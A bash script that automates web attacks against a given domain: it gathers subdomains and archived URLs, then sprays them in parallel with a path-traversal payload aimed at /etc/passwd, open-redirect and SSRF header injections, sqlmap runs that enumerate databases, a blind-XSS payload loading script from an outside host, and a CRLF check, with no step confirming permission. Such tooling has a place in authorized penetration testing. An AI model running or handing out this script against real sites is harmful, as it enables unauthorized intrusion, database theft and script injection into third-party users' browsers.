#!/bin/bash

# Usage: ./full_script.sh <domain>

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

domain=$1
output_file="live-domains"
urls_file="urls.txt"

# Step 1: Subdomain discovery
subfinder -d $domain -o $output_file
echo "Subdomain discovery completed. Results saved to $output_file"

# Step 2: Extract URLs from subdomains using Waybackurls
cat $output_file | waybackurls > $urls_file
echo "URL extraction completed. Results saved to $urls_file"

# Step 3: Local File Inclusion (LFI) check
lfi() {
    local LFI_PAYLOAD="....//....//....//etc/passwd"
    cat $urls_file | qsreplace "$LFI_PAYLOAD" | xargs -I % -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
}
lfi

# Step 4: Open redirect check with specific headers
open_redirect() {
    local LHOST="http://localhost"
    cat $urls_file | xargs -P 40 -I {} sh -c 'if curl -Iks -m 10 "$1" -H "CF-Connecting-IP: https://redirect.com" -H "From: root@https://redirect.com" -H "Client-IP: https://redirect.com" -H "X-Client-IP: https://redirect.com" -H "X-Forwarded-For: https://redirect.com" -H "X-Wap-Profile: https://redirect.com" -H "Forwarded: https://redirect.com" -H "True-Client-IP: https://redirect.com" -H "Contact: root@https://redirect.com" -H "X-Originating-IP: https://redirect.com" -H "X-Real-IP: https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "$1" -H "CF-Connecting-IP: redirect.com" -H "From: root@redirect.com" -H "Client-IP: redirect.com" -H "X-Client-IP: redirect.com" -H "X-Forwarded-For: redirect.com" -H "X-Wap-Profile: redirect.com" -H "Forwarded: redirect.com" -H "True-Client-IP: redirect.com" -H "Contact: root@redirect.com" -H "X-Originating-IP: redirect.com" -H "X-Real-IP: redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "The URL $1 with vulnerable header may be vulnerable to Open Redirection. Check Manually"; fi'
}
open_redirect

# Step 5: SQL Injection (SQLi) check
sqli() {
    cat $urls_file | gf sqli | xargs -P 20 -I {} sh -c 'if curl -Is "{}" | head -1 | grep -q "HTTP"; then echo "Running Sqlmap on '{}'"; sqlmap -u "{}" --batch --random-agent --dbs --crawl 10 ; fi'
}
sqli

# Step 6: XSS (Cross-Site Scripting) check
xss() {
    cat $urls_file | gf xss | qsreplace '"><script src=https://mickymouse.bxss.in></script>' | xargs -P 40 -I {} curl -sk "{}" -o /dev/null
}
xss

# Step 7: CRLF Injection check
crlf_injection_check() {
    cat $urls_file | xargs -P 40 -I {} sh -c 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
}
crlf_injection_check

# Step 8: SSRF testing
get_burp_collab_link() {
    read -p "Enter your Burp Collaborator server link: " BURP_COLLAB_LINK
    echo "Using Burp Collaborator server link: $BURP_COLLAB_LINK"
}
get_burp_collab_link

ssrf_test() {
    local BURP_COLLAB_LINK=$1

    cat live-domains | xargs -P 40 -I {} sh -c '
        if curl -skL -o /dev/null "{}" \
            -H "CF-Connecting_IP: $BURP_COLLAB_LINK" \
            -H "From: root@$BURP_COLLAB_LINK" \
            -H "Client-IP: $BURP_COLLAB_LINK" \
            -H "X-Client-IP: $BURP_COLLAB_LINK" \
            -H "X-Forwarded-For: $BURP_COLLAB_LINK" \
            -H "X-Wap-Profile: http://$BURP_COLLAB_LINK/wap.xml" \
            -H "Forwarded: $BURP_COLLAB_LINK" \
            -H "True-Client-IP: $BURP_COLLAB_LINK" \
            -H "Contact: root@$BURP_COLLAB_LINK" \
            -H "X-Originating-IP: $BURP_COLLAB_LINK" \
            -H "X-Real-IP: $BURP_COLLAB_LINK"; 
        then 
            echo "{}" | ts; 
        fi
    ' | tee -a ssrf-headers-out.txt

    cat urls.txt | xargs -P 40 -I {} sh -c '
        if curl -skL "{}" -o /dev/null; 
        then 
            echo "{}" | ts; 
        fi
    ' | tee -a ssrf-output-log.txt
}
ssrf_test $BURP_COLLAB_LINK

echo "LFI, open redirect, SQL injection, XSS, CRLF Injection, and SSRF checks with headers completed."
